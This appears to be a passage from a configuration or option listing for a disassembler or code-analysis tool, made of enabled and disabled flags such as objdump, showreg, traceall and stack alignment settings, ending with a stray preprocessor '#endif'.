option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
